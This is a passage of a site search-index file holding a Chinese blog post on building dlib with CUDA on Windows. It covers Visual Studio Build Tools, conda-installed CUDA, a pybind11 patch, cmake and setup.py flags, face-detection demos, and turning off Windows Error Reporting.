<p>\u8fd9\u4e2a\u65b9\u6848\u7684\u51fa\u73b0\uff0c\u5c31\u662f\u4e3a\u4e86\u7528\u4e00\u4e2a\u7b80\u5355\u3001\u76f4\u89c2\u3001\u6709\u6548\u7684\u65b9\u6cd5\uff0c\u4e00\u6b21\u6027\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_2","title":"\u62df\u8bae\u65b9\u6848\u7684\u524d\u63d0\u6761\u4ef6","text":"<p>\u5728\u6240\u6709\u6b65\u9aa4\u5f00\u59cb\u4e4b\u524d\uff0c\u8bf7\u5148\u786e\u4fdd\u4f60\u6ee1\u8db3\u4ee5\u4e0b\u524d\u63d0\u6761\u4ef6\uff1a</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_3","title":"\u7cfb\u7edf\u67b6\u6784","text":"<p>\u4e3a\u4e86\u907f\u514d\u4e0d\u5fc5\u8981\u7684\u9ebb\u70e6\uff0c\u8bf7\u5728\u63a5\u4e0b\u6765\u7684\u6240\u6709\u6b65\u9aa4\u4e2d\uff0c\u5747\u4f7f\u7528 64 \u4f4d\u7cfb\u7edf\u67b6\u6784\uff08amd64 \u6216\u8005 x64\uff09\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#conda","title":"Conda","text":"<p>\u76ee\u524d\u6211\u7684\u7248\u672c\u662f Anaconda 1.9.0\uff0c\u5176\u4ed6\u7248\u672c\u5e94\u8be5\u4e0d\u5f71\u54cd\u3002\u540c\u7406\uff0cPython \u7248\u672c\u5e94\u8be5\u4e5f\u4e0d\u5f71\u54cd\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#visual-studio","title":"Visual Studio","text":"<p>\u4ee5\u4e0b Visual Studio \u4e2d\uff0c\u4f60\u81f3\u5c11\u9700\u8981\u62e5\u6709\u4e00\u4e2a\uff1a</p> <ul> <li>Visual Studio 2019</li> <li>Build Tools for Visual Studio 2019</li> <li>Visual Studio 2017</li> <li>Build Tools for Visual Studio 2017</li> </ul> <p>\u56e0\u4e3a\u6211\u4e0d\u60f3\u4e0b\u5341\u51e0\u4e2a GB \u7684 Visual Studio 2019/2017\uff0c\u6240\u4ee5\u6211\u4f7f\u7528\u7684\u662f Build Tools for Visual Studio 2019\u3002\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u4ed6\u4ecd\u7136\u4f1a\u5360\u7528\u6211\u5927\u7ea6 4 GB \u7684\u78c1\u76d8\u7a7a\u95f4\uff08\u5176\u4e2d C \u76d8\u56fa\u5b9a\u5360\u7528\u7ea6 2 GB\uff09\uff0c\u4f46\u8fd9\u6bd4\u8d77\u6765\u5df2\u7ecf\u8db3\u591f\u5c0f\u4e86\u3002</p> <p>\u5371\u9669</p> <p>\u4f60\u53ef\u80fd\u60f3\u95ee Visual Studio 2015\uff08\u542b\uff09\u4ee5\u4e0b\u7b49\u4e0d\u5728\u6b64\u5217\u7684 Visual Studio \u7248\u672c\u884c\u4e0d\u884c\uff0c\u8fd9\u91cc\u660e\u786e\u8868\u793a\uff1a</p> <p>\u4e0d\u884c\uff01\uff01\uff01</p> <pre><code>#if _MSC_VER &lt; 1910 || _MSC_VER &gt;= 1930\n#error -- unsupported Microsoft Visual Studio version! Only the versions between 2017 and 2019 (inclusive) are\n</code></pre> <p>\u53e6\u89c1\uff1a</p> <ul> <li>CUDA Installation Guide for Microsoft Windows</li> <li>CUDA Compilers</li> </ul> <p>\u4ee5\u4e0b Visual Studio \u5de5\u4f5c\u8d1f\u8f7d\u4e2d\uff0c\u5fc5\u987b\u5168\u90e8\u62e5\u6709\uff1a</p> <ul> <li>MSVC VS 2017\uff08\u6216 2019\uff09C++ x64/x86 \u751f\u6210\u5de5\u5177</li> <li>Windows 10 SDK</li> <li>\u7528\u4e8e Windows \u7684 C++ CMake \u5de5\u5177</li> </ul> <p>\u5371\u9669</p> <p>\u6ce8\u610f\u6700\u540e\u4e00\u4e2a</p> <ul> <li>\u7528\u4e8e Windows \u7684 C++ CMake \u5de5\u5177</li> </ul> <p>\u5c31\u7b97\u4f60\u5df2\u7ecf\u6709\u4e86 Kitware \u7684 CMake \u4f60\u4ecd\u7136\u9700\u8981\u52fe\u9009\uff0c\u4e0d\u7136\u5c31\u7b97\u901a\u8fc7\u4e86 CXX \u7f16\u8bd1\u5668\u6d4b\u8bd5\u9636\u6bb5\uff0c\u5728\u5b9e\u9645\u7f16\u8bd1\u7684\u65f6\u5019\u4ecd\u7136\u53ef\u80fd broken\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u8bb0\u5f97\u4fee\u6539\u5b89\u88c5\u8def\u5f84\uff0c\u522b\u4e00\u80a1\u8111\u5168\u585e C \u76d8\u4e86\uff1a</p> <p></p> <p>\u5371\u9669</p> <p>\u8bf7\u5728\u9000\u51fa Visual Studio Installer \u540e\u7acb\u5373\u68c0\u67e5\u4f60\u7684\u4e34\u65f6\u6587\u4ef6\u5939\uff0c\u4f8b\u5982 <code>C:\\Users\\AkibaArisa\\Temp</code>\uff0cVisual Studio Installer \u53ef\u80fd\u4f1a\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u5bfc\u81f4\u9664\u4e86 <code>\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c</code> \u7684\u7a0b\u5e8f\u4ee5\u5916\uff0c\u5747\u65e0\u6cd5\u5199\u5165\u8be5\u6587\u4ef6\u5939\u3002</p> <p>\u4f60\u6240\u9700\u8981\u505a\u7684\u5c31\u662f\u68c0\u67e5\u8fd9\u4e2a\u4e34\u65f6\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u5982\u679c\u53d1\u73b0\u6709\u95ee\u9898\uff0c\u5219\u7528\u4ee5\u4e0b\u65b9\u6cd5\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1a</p> <p>\u53f3\u952e\u8be5\u6587\u4ef6\u5939 - <code>\u5c5e\u6027</code> - <code>\u5b89\u5168</code> - <code>\u7f16\u8f91</code> - <code>Everyone</code> - \u52fe\u9009 <code>\u5b8c\u5168\u63a7\u5236</code> - <code>\u786e\u8ba4</code></p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_4","title":"\u62df\u8bae\u65b9\u6848\u7684\u6267\u884c\u6b65\u9aa4","text":"","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#conda_1","title":"\u6784\u5efa Conda \u73af\u5883","text":"<p>\u7b14\u8005\u7684 PyCharm \u80fd\u8ba9\u65b0\u9879\u76ee\u9009\u62e9 Conda \u73af\u5883\u5e76\u9ed8\u8ba4\u6784\u5efa\u597d\uff0c\u8fd9\u91cc\u7565\u8fc7\u4f7f\u7528 IDE \u6784\u5efa\u7684\u65b9\u6cd5\u3002</p> <p></p> <p>\u6216\u8005\u4f7f\u7528\u624b\u52a8\u6784\u5efa\uff1a</p> <pre><code>conda create -n dlib_build_test python=3.10\n</code></pre> <p>\u7136\u540e\u8fdb\u5165\u865a\u62df\u73af\u5883\uff1a</p> <pre><code>conda activate dlib_build_test\n</code></pre>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#cuda-cudnn","title":"\u5b89\u88c5 CUDA \u548c cuDNN","text":"<p>\u4e0d\u901a\u8fc7 Nvidia \u5b98\u7f51\uff0c\u800c\u662f\u901a\u8fc7 Conda \u5b89\u88c5 CUDA \u548c cuDNN\u3002</p> <pre><code>conda install cuda cudnn -c nvidia\n</code></pre> <p>\u63a5\u4e0b\u6765\u53ef\u80fd\u4f1a\u7b49\u5f85\u4e00\u4f1a\uff0c\u56e0\u4e3a\u8981\u4e0b\u8f7d\u5f88\u591a\u4e1c\u897f\u3002</p> <p>\u5b89\u88c5\u540e\u53ef\u4ee5\u901a\u8fc7 <code>conda list</code> \u547d\u4ee4\u786e\u8ba4\u5b89\u88c5\u7684\u7248\u672c\uff1a</p> <pre><code># Name                    Version                   Build    Channel\n...\ncuda                      11.6.2               h65bbf44_0    nvidia\ncuda-cccl                 11.6.55              hd268e57_0    nvidia\ncuda-command-line-tools   11.6.2               h65bbf44_0    nvidia\ncuda-compiler             11.6.2               h65bbf44_0    nvidia\ncuda-cudart               11.6.55              h5fb1900_0    nvidia\ncuda-cuobjdump            11.6.124             h8654613_0    nvidia\ncuda-cupti                11.6.124             h532822a_0    nvidia\ncuda-cuxxfilt             11.6.124             h3f9c74b_0    nvidia\ncuda-libraries            11.6.2               h65bbf44_0    nvidia\ncuda-libraries-dev        11.6.2               h65bbf44_0    nvidia\ncuda-memcheck             11.6.124             hea6bc18_0    nvidia\ncuda-nvcc                 11.6.124             h769bc0d_0    nvidia\ncuda-nvdisasm             11.6.124             he05ff55_0    nvidia\ncuda-nvml-dev             11.6.55              h2bb381e_0    nvidia\ncuda-nvprof               11.6.124             he581663_0    nvidia\ncuda-nvprune              11.6.124             hb892de1_0    nvidia\ncuda-nvrtc                11.6.124             h231bd66_0    nvidia\ncuda-nvrtc-dev            11.6.124             hd7d06dc_0    nvidia\ncuda-nvtx                 11.6.124             hee9d5a4_0    nvidia\ncuda-nvvp                 11.6.124             h6a974fa_0    nvidia\ncuda-runtime              11.6.2               h65bbf44_0    nvidia\ncuda-sanitizer-api        11.6.124             ha4888a7_0    nvidia\ncuda-toolkit              11.6.2               h65bbf44_0    nvidia\ncuda-tools                11.6.2               h65bbf44_0    nvidia\ncuda-visual-tools         11.6.2               h65bbf44_0    nvidia\ncudatoolkit               11.3.1               h59b6b97_2\ncudnn                     8.2.1                cuda11.3_0\n...\n</code></pre> <p>\u663e\u7136\uff0c\u6211\u5b89\u88c5\u7684 CUDA \u7248\u672c\u662f <code>11.6.2</code>\uff0ccuDNN \u7248\u672c\u662f <code>8.2.1</code>\u3002</p> <p>\u5b89\u88c5\u5b8c\u6210\u540e\u786e\u8ba4 <code>nvcc.exe</code> \u7684\u5b89\u88c5\u4f4d\u7f6e\uff0c\u5e76\u8bb0\u4f4f\u5b83\u3002</p> <pre><code>(dlib_build_test) I:\\Developer\\Python\\project\\dlib_build_test&gt;where nvcc\n:: I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe\n</code></pre> <p>\u4f8b\u5982\u73b0\u5728\u5b83\u5728 <code>I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe</code>\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#dlib","title":"\u83b7\u53d6 dlib \u6e90\u7801","text":"<p>\u4ece Releases \u4e0b\u8f7d\uff1a\uff08\u63a8\u8350\uff09v19.23</p> <p>\u6216\u8005\u4ece GitHub\u514b\u9686\uff1a</p> <pre><code>git clone https://github.com/davisking/dlib.git\ncd dlib\n</code></pre>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_5","title":"\u5728\u6784\u5efa\u4e4b\u524d","text":"","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#msvc-x64","title":"\u8fdb\u5165 MSVC x64 \u7f16\u8bd1\u73af\u5883","text":"<pre><code>%comspec% /k \"I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\"\n</code></pre> <p>\u5176\u4e2d\u7684\u8def\u5f84\u9700\u8981\u6839\u636e\u4f60\u7684 Visual Studio \u7684\u5b89\u88c5\u4f4d\u7f6e\u800c\u6539\u53d8\uff0c\u4f46\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5176\u5b9e\u662f\u4ece\u5f00\u59cb\u83dc\u5355\u4e2d\u627e\u5230 <code>x64 Native Tools Command Prompt for VS 2019</code> \u7684\u5feb\u6377\u65b9\u5f0f\uff0c\u7136\u540e\u70b9\u51fb\u53f3\u952e\u67e5\u770b\u5c5e\u6027\u3002</p> <p></p> <p>\u590d\u5236\u5e76\u7c98\u8d34\u5176 <code>\u76ee\u6807</code> \u5373\u53ef\u3002</p> <p>\u8fd0\u884c\u540e\uff0c\u8fd9\u4e2a bat \u811a\u672c\u5c06\u4f1a\u81ea\u52a8\u628a MSVC \u7684\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u5230\u4f60\u7684\u4e34\u65f6\u73af\u5883\u53d8\u91cf\u4e2d\uff08\u4ec5\u5728\u5f53\u524d\u63a7\u5236\u53f0\u6709\u6548\uff09\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u6784\u5efa dlib \u7684\u65f6\u5019\u4f7f\u7528 MSVC \u7684\u7f16\u8bd1\u5668\u4e86\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\u91cd\u8981\u7684\u73af\u5883\u53d8\u91cf\u662f\u5426\u8bbe\u7f6e\u6b63\u786e\uff1a</p> <pre><code>where cmake\n:: G:\\Tools for Windows\\CMake\\bin\\cmake.exe\n:: I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\Common7\\IDE\\CommonExtensions\\Microsoft\\CMake\\CMake\\bin\\cmake.exe\nwhere nmake\n:: I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.29.30133\\bin\\Hostx64\\x64\\nmake.exe\nwhere cl\n:: I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.29.30133\\bin\\Hostx64\\x64\\cl.exe\n</code></pre> <p>\u63d0\u793a</p> <p>\u8fd0\u884c <code>where cmake</code> \u7684\u65f6\u5019\u51fa\u73b0\u4e86\u4e24\u4e2a <code>cmake</code>\uff0c\u5176\u4e2d\u4e00\u4e2a\u662f Kitware \u7684 cmake\uff0c\u53e6\u4e00\u4e2a\u662f MSVC \u7684 cmake\u3002\u800c dlib \u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u4f1a\u68c0\u67e5\u6240\u6709 cmake \u7684\u8def\u5f84\uff0c\u5982\u679c\u4e0d\u5b58\u5728 MSVC \u7684 cmake\uff0c\u811a\u672c\u4f1a\u62a5\u9519\u800c\u505c\u6b62\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#dlib_1","title":"\u4fee\u6539 dlib \u6e90\u7801","text":"<p>\u89c1 Dlib failed to build due to many errors: error C2065 and C2338 \u00b7 Issue #2463 \u00b7 davisking/dlib</p> <p>\u6253\u5f00 <code>dlib\\dlib\\external\\pybind11\\include\\pybind11/numpy.h</code>\uff0c\u627e\u5230\uff1a</p> numpy.h<pre><code>#if defined(_MSC_VER)\n#  pragma warning(push)\n#  pragma warning(disable: 4127) // warning C4127: Conditional expression is constant\n#endif\n</code></pre> <p>\u6dfb\u52a0\u4e24\u884c\uff0c\u6539\u4e3a\uff1a</p> numpy.h<pre><code>#if defined(_MSC_VER)\n#  pragma warning(push)\n#  pragma warning(disable: 4127) // warning C4127: Conditional expression is constant\n#include &lt;BaseTsd.h&gt;\ntypedef SSIZE_T ssize_t;\n#endif\n</code></pre>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_6","title":"\u5f00\u59cb\u6784\u5efa","text":"<pre><code>mkdir build\ncd build\ncmake .. -DDLIB_USE_CUDA=1 -DUSE_AVX_INSTRUCTIONS=1 -DCUDAToolkit_ROOT=%NVCC_PATH%\n</code></pre> <p>\u5176\u4e2d <code>%NVCC_PATH%</code> \u662f\u4f60\u5728\u4e4b\u524d\u83b7\u53d6\u7684\u8def\u5f84\uff0c\u4f8b\u5982 <code>I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe</code>\u3002</p> <p>\u57fa\u4e8e\u6211\u4eec\u505a\u597d\u7684\u524d\u671f\u94fa\u57ab\uff0c\u7406\u8bba\u4e0a\u8fd9\u91cc\u53ef\u4ee5\u4e00\u6b21\u6027\u6784\u5efa\u6210\u529f\uff0c\u5982\u679c\u6784\u5efa\u4ecd\u7136\u6ca1\u6709\u6210\u529f\uff0c\u8bf7\u4ed4\u7ec6\u9605\u8bfb <code>CMakeError.log</code> \u6587\u4ef6\uff0c\u5206\u6790\u5176\u4e2d\u51fa\u73b0\u7684\u9519\u8bef\u3002\u5728\u6bcf\u6b21\u91cd\u65b0\u6784\u5efa\u4e4b\u524d\uff0c\u8bf7\u5148\u5220\u9664 <code>build</code> \u6587\u4ef6\u5939\u91cc\u7684\u6240\u6709\u5185\u5bb9\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_7","title":"\u5c1d\u8bd5\u7f16\u8bd1","text":"<pre><code>cmake --build .\n</code></pre> <p>\u540c\u4e0a\uff0c\u7406\u8bba\u4e0a\u662f\u4e00\u6b21\u6027\u6784\u5efa\u6210\u529f\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_8","title":"\u5c1d\u8bd5\u5b89\u88c5","text":"<pre><code>python setup.py install --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT\n</code></pre> <p>\u5371\u9669</p> <p>\u5fc5\u987b\u6dfb\u52a0 <code>--no DLIB_GIF_SUPPORT</code> \u53c2\u6570\uff0c\u5426\u5219\u4f1a\u53d1\u751f\u9519\u8bef\uff1a<code>error C2734: \u201cGifAsciiTable8x8\u201d: \u5982\u679c\u4e0d\u662f\u5916\u90e8\u7684\uff0c\u5219\u5fc5\u987b\u521d\u59cb\u5316\u5e38\u91cf\u5bf9\u8c61</code></p> <p>\u89c1 Dlib install errors out : error C2734: 'GifAsciiTable8x8' : 'const' object must be initialized if not 'extern' \u00b7 Issue #2358 \u00b7 davisking/dlib</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5728\u975e\u624b\u52a8\u7f16\u8bd1\u73af\u5883\u4e2d\uff08\u4f8b\u5982\u76f4\u63a5\u4f7f\u7528 <code>pip install</code>\uff09\u5b89\u88c5\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6307\u5b9a\u8be5\u53c2\u6570\uff1a</p> <pre><code>pip install -v --install-option=\"--no\" --install-option=\"DLIB_GIF_SUPPORT\" dlib\n</code></pre> <p>\u4ee5\u53ca\u5982\u679c\u4f60\u60f3\u7f16\u8bd1\u51fa <code>.whl</code> \u6587\u4ef6\u9020\u798f\u4ed6\u4eba\uff0c\u5728\u7f16\u8bd1\u65f6\u540c\u6837\u9700\u8981\u52a0\u5165\u8be5\u53c2\u6570\uff0c\u5373\uff1a</p> <pre><code>python setup.py bdist_wheel --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT\n</code></pre>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_9","title":"\u5728\u5b89\u88c5\u4e4b\u540e","text":"","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#dlib_2","title":"\u5378\u8f7d\u65e7\u7248\u672c\u7684 dlib","text":"<p>\u5c31\u7b97\u5728\u4e0a\u4e00\u6b65\u7684 <code>python setup.py install</code> \u6ca1\u6709\u4efb\u4f55\u62a5\u9519\uff0c\u6211\u4eec\u7684 dlib \u4e5f\u53ef\u80fd\u8fd8\u6ca1\u6709\u6b63\u786e\u5b89\u88c5\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e9b\u7528\u6237\uff0c\u4ed6\u4eec\u53ef\u80fd\u662f\u5c5e\u4e8e\u4e2d\u9014\u52a0\u5165\u8fd9\u4e2a\u65b9\u6848\u7684\u3002\u4f8b\u5982\uff0c\u4ed6\u4eec\u5728\u6b64\u4e4b\u524d\u5df2\u7ecf\u4ece</p> <pre><code>conda install -c conda-forge dlib \n</code></pre> <p>\u5b89\u88c5\u4e86\u4e0d\u5e26 CUDA \u7684 dlib\u3002</p> <p>\u56e0\u4e3a\u7248\u672c\u539f\u56e0\uff08Release \u4e0b\u8f7d\u7684\u662f <code>19.23</code> \u7248\u672c\uff0c\u800c <code>conda install</code> \u5b89\u88c5\u7684\u662f <code>19.23.1</code> \u7248\u672c\uff09\uff0c\u65e7\u7248\u672c\u7684 dlib \u4e0d\u4f1a\u88ab\u4f7f\u7528\uff0c\u56e0\u6b64 <code>dlib.DLIB_USE_CUDA</code> \u7684\u503c\u5c06\u4ecd\u7136\u662f <code>False</code>\u3002</p> <p>\u6b64\u65f6\u5378\u8f7d\u539f\u6765\u5b89\u88c5\u7684 <code>dlib</code></p> <pre><code>conda remove dlib\n</code></pre> <p>\u7136\u540e\u518d\u8fdb\u884c\u4e00\u6b21\u4e0a\u4e00\u6b65\u7684\u5b89\u88c5\u64cd\u4f5c</p> <pre><code>python setup.py install --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT\n</code></pre> <p>\u73b0\u5728 <code>dlib.DLIB_USE_CUDA</code> \u7684\u503c\u5e94\u5f53\u662f <code>True</code></p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#windows","title":"\u5173\u95ed Windows \u9519\u8bef\u62a5\u544a\u670d\u52a1","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u7384\u5b66\u7684\u4e1c\u897f\u3002\u5728\u542f\u7528\u4e86 CUDA \u7684 dlib \u6b63\u786e\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6709\u4e9b\u4eba\u5728\u8fd0\u884c\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u53d1\u751f\u8fd9\u4e2a\u9519\u8bef\u3002\u5177\u4f53\u4f53\u73b0\u5982\u4e0b\uff1a</p> <p>\u8fd9\u91cc\u6709\u4e24\u4efd\u5dee\u4e0d\u591a\u7684\u4eba\u8138\u68c0\u6d4b demo\uff0c\u5176\u4e2d\u4e00\u4e2a\u4f7f\u7528 HOG\uff0c\u53e6\u4e00\u4e2a\u4f7f\u7528 CNN\u3002</p> HOGCNN detection.py<pre><code>import cv2\nimport imutils\nimport dlib\n\ndetector = dlib.get_frontal_face_detector()\nimage = cv2.imread('image/test.jpg')\nresized_image = imutils.resize(image, width=600)\nrgb = cv2.cvtColor(resized_image, cv2.COLOR_BGR2RGB)\n\nresults = detector(rgb, 1)\nfor result in results:\n    print(result)\n</code></pre> detection.py<pre><code>import cv2\nimport imutils\nimport dlib\n\ndetector = dlib.cnn_face_detection_model_v1('model/mmod_human_face_detector.dat')\nimage = cv2.imread('image/test.jpg')\nresized_image = imutils.resize(image, width=600)\nrgb = cv2.cvtColor(resized_image, cv2.COLOR_BGR2RGB)\n\nresults = detector(rgb, 1)\nfor result in results:\n    print(result.rect)\n    print(result.confidence)\n</code></pre> <p>\u5f53 dlib \u4f7f\u7528 <code>get_frontal_face_detector()</code>\uff08HOG\uff09\u8fdb\u884c\u4eba\u8138\u68c0\u6d4b\u65f6\uff0c\u4e0d\u4f1a\u53d1\u751f\u4efb\u4f55\u95ee\u9898\u3002</p> <p>\u5f53 dlib \u4f7f\u7528 <code>cnn_face_detection_model_v1()</code>\uff08CNN\uff09\u8fdb\u884c\u4eba\u8138\u68c0\u6d4b\u65f6\uff0c\u80fd\u987a\u5229\u8fdb\u884c\u68c0\u6d4b\uff0c\u4efb\u52a1\u7ba1\u7406\u5668\u7684 CUDA \u4f7f\u7528\u7387\u4e5f\u4f1a\u6b63\u5e38\u4e0a\u6da8\u3002</p> <p>\u4f46\u662f\u5728\u68c0\u6d4b\u7ed3\u675f\u4e4b\u540e\uff0c\u8fd9\u4e2a\u811a\u672c\u4f1a\u5361\u4f4f\uff0c\u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668\u53ef\u4ee5\u53d1\u73b0 C \u76d8\u4f7f\u7528\u7387\u63a5\u8fd1 100%\u3002\u5927\u7ea6 1~2 \u5206\u949f\u540e C \u76d8\u4f7f\u7528\u7387\u6062\u590d\u6b63\u5e38\uff0c\u811a\u672c\u4e5f\u6b63\u5e38\u7ed3\u675f\u3002</p> <p>\u4e8b\u540e\u8c03\u67e5\u53d1\u73b0\uff0c\u662f <code>Windows \u9519\u8bef\u62a5\u544a</code> \u6b63\u5728\u5411 C \u76d8\u5199\u5165\u5927\u91cf\u5185\u5bb9\uff08\u5185\u5b58\u8f6c\u50a8\uff09\uff0c\u5199\u5165\u7684\u4f4d\u7f6e\u662f <code>C:\\Users\\AkibaArisa\\AppData\\Local\\CrashDumps</code>\uff0c\u6bcf\u6b21\u5199\u5165\u4e00\u4e2a\u5927\u5c0f\u7ea6\u4e3a 1 GB \u7684 <code>.dmp</code> \u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e0e python \u6709\u5173\u3002</p> <p>\u5b9e\u9645\u4e0a\u6211\u4eec\u7684 python \u811a\u672c\u5e76\u6ca1\u6709\u53d1\u751f\u4efb\u4f55\u5d29\u6e83\uff0c\u800c\u4e14\u4e5f\u662f\u6b63\u5e38\u7ed3\u675f\u7684\uff0c\u56e0\u6b64\u8fd9\u4e2a\u9519\u8bef\u62a5\u544a\u7eaf\u5c5e\u753b\u86c7\u6dfb\u8db3\u3002</p> <p>\u73b0\u5728\u5173\u95ed\u6389 <code>Windows \u9519\u8bef\u62a5\u544a\u670d\u52a1</code>\uff1a</p> <ol> <li> <p>\u9996\u5148\u4f7f\u7528 PowerShell \u505c\u7528\uff1a</p> <p>\uff08\u89c1 Disable-WindowsErrorReporting (WindowsErrorReporting) | Microsoft Docs \uff09    </p> <pre><code>PS C:\\&gt; Disable-WindowsErrorReporting\n# False\n</code></pre> </li> <li> <p>\u7136\u540e\u5728\u670d\u52a1\u4e2d\u505c\u7528\uff1a</p> <ol> <li>\u6253\u5f00 <code>\u670d\u52a1</code>\uff08\u8fd0\u884c <code>services.msc</code> \u6216\u8005\u4f7f\u7528\u4efb\u52a1\u7ba1\u7406\u5668\uff09\u3002</li> <li>\u627e\u5230 <code>Windows Error Reporting Service</code>\uff0c\u53f3\u952e <code>\u5c5e\u6027</code>\u3002</li> <li>\u5c06 <code>\u542f\u52a8\u7c7b\u578b</code> \u8bbe\u4e3a <code>\u7981\u7528</code>\u3002</li> <li>\u5728 <code>\u670d\u52a1\u72b6\u6001</code> \u5904\u70b9\u51fb <code>\u505c\u6b62</code>\u3002</li> </ol> </li> </ol> <p>\u5982\u6b64\u4e00\u6765\uff0cWindows \u5c06\u4e0d\u4f1a\u518d\u4ea7\u751f\u9519\u8bef\u62a5\u544a\uff0c\u6211\u4eec\u4f7f\u7528\u4e86 <code>cnn_face_detection_model_v1()</code> \u7684 python \u811a\u672c\u4e5f\u5c06\u5728\u68c0\u6d4b\u5b8c\u6210\u540e\u6b63\u5e38\u7ed3\u675f\uff0c\u4e0d\u4f1a\u4e00\u76f4\u6401\u8fd9\u5361\u7740\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_10","title":"\u7ed3\u8bba","text":"<p>\u7279\u5b9a\u7684 CUDA + Visual Studio + dlib + python \u7248\u672c\u7684\u7ec4\u5408\u76ee\u524d\u4ecd\u7136\u662f dlib \u4e2d\u7684\u4e00\u5927\u96be\u9898\u3002\u5982\u4f60\u6240\u89c1\uff0c\u8fd9\u4e2a\u65b9\u6848\u7684\u9605\u8bfb\u52a0\u5b9e\u8df5\u7684\u603b\u65f6\u957f\u53ef\u80fd\u8d85\u8fc7\u4e86\u534a\u4e2a\u5c0f\u65f6\uff0c\u5948\u4f55\u4e0d\u540c\u8f6f\u4ef6\uff0c\u4e0d\u540c\u5e73\u53f0\u4e4b\u95f4\u7684\u914d\u5957\u7684\u786e\u5f88\u56f0\u96be\uff0c\u4f46\u6211\u4eec\u4ecd\u5c06\u89e3\u51b3\u4ed6\u4eec\u3002\u76f8\u4fe1\u8fd9\u4e2a\u65b9\u6848\u53ef\u4ee5\u5e2e\u52a9\u5230\u66f4\u591a\u7684\u4eba\u3002</p>","tags":["dlib","visual-studio","python","anaconda"]},{"location":"blog/2022/220429-dilb-ultimate-solution/#_11","title":"\u81f4\u8c22","text":"<p>\u611f\u8c22 dlib \u7684\u6240\u6709\u8d21\u732e\u8005\u4e3a\u6211\u4eec\u5e26\u6765\u4e86\u5b9e\u7528\u7684\u673a\u5668\u5b66\u4e60\u5de5\u5177\uff1b\u611f\u8c22\u6240\u6709\u5728 GitHub dlib \u4ed3\u5e93\u4e0b\u63d0\u51fa\u548c\u89e3\u51b3 issue 